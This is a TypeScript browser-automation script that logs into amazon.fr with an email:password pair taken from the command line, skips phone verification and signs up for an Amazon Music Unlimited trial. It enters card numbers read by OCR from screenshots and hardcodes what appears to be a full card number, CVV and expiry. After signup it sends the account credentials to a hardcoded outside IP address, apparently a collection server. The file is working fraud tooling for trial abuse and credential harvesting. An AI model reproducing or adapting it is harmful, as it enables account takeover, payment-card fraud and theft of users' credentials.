import { click, get, type, waitForSelector, rand, select } from "./helpers/helpers"
import { openBrowser } from "./openBrowser"
import shell from 'shelljs'
const request = require('ajax-request');

const props = process.argv
const arg = props[2]
const address = props[3]
const city = props[4]
const card = '5354 5627 2150 9230'
const code = '766'
const date = '1027'

const getCard = () => new Promise<{
	card: any
	month: any
	year: any
	cvv: any
}>((res, rej) => {
	shell.exec("mv public/Capture* public/1.jpg", { silent: true })
	const code = shell.exec("node build/helpers/tesseract.js 'public/1.jpg'", { silent: true })

	const a = code.stdout.replace(/\s/g, '')

	const card = a.match(/\d{16}/g)
	const [month, year] = (a.match(/\d{2}\/\d{2}/g) as any)[0].split('/')
	const cvv = a.match(/\d{3}$/g)

	res({ card: (card as any)[0], month, year, cvv: (cvv as any)[0] })
})

// getCard()

const go = async () => {
	const { chrome, protocol, ...browserProps } = await openBrowser()

	// @ts-ignore
	const { N, P, R, D, B, I, T, S, socketEmit, player, login, check } = browserProps

	if (!protocol || !P) { return }

	const [email, password] = arg.split(':')

	await P.navigate({ url: 'https://www.amazon.fr' });
	// @ts-ignore
	P.loadEventFired();

	await click(I, R, '#nav-signin-tooltip a')
	// await click(I, R, '#signInButton')

	const amazonReLogBody = await get(R, 'body', 'innerText')
	const loginRegex = new RegExp(email)
	const amazonReLog = amazonReLogBody && loginRegex.test(amazonReLogBody)

	if (!amazonReLog) {
		await type(R, email, '#ap_email')
		await click(I, R, '#continue')
	}

	await type(R, password, '#ap_password')
	await click(I, R, '#signInSubmit')

	const skip = await waitForSelector(R, '#ap-account-fixup-phone-skip-link', 5)
	skip && await click(I, R, '#ap-account-fixup-phone-skip-link')

	await P.navigate({ url: 'https://www.amazon.fr/music/unlimited' })

	await click(I, R, '[url-type="UNLIMITED_TRIAL"]')

	// await waitForSelector(R, '[title="AMÉLIORER OFFRE"]', 60 * 1000 * 10)
	// await click(I, R, '[title="AMÉLIORER OFFRE"]')
	// await click(I, R, '#dialogButton1')

	// await click(I, R, '.pmts-portal-component [value="modifier"]')

	// await click(I, R, '[data-action="a-expander-toggle"]')

	await type(R, 'Micro', '[name="ppw-accountHolderName"]')

	const cc = await getCard()

	await type(R, cc.card, '[name="addCreditCardNumber"]')
	await type(R, cc.cvv, '[name="addCreditCardVerificationNumber"]')

	await select(R, '[name="ppw-expirationDate_month"]', cc.month)
	await select(R, '[name="ppw-expirationDate_year"]', `20${cc.year}`)

	await click(I, R, '[name="ppw-widgetEvent:AddCreditCardEvent"]')
	await click(I, R, '[name="ppw-widgetEvent:SelectAddressEvent"]')

	await click(I, R, '.a-button-input')
	await click(I, R, '#atc-skip-button')
	await click(I, R, '#atc-modal-secondary-button')

	request(encodeURIComponent('http://216.158.239.199:3000/addAccount?amazon:' + arg), () => { process.exit() })

	// await waitForSelector(R, '[name="ppw-line1"]', 60 * 1000 * 10)
	// await type(R, address, '[name="ppw-line1"]')
	// await type(R, city, '[name="ppw-city"]')
	// await type(R, '75010', '[name="ppw-postalCode"]')
	// await type(R, '06' + rand(99999999, 11111111), '[name="ppw-phoneNumber"]')

	// await click(I, R, '[name="ppw-widgetEvent:AddAddressEvent"]')
	// await click(I, R, '[name="ppw-widgetEvent:UseSuggestedAddressEvent"]')
}

go()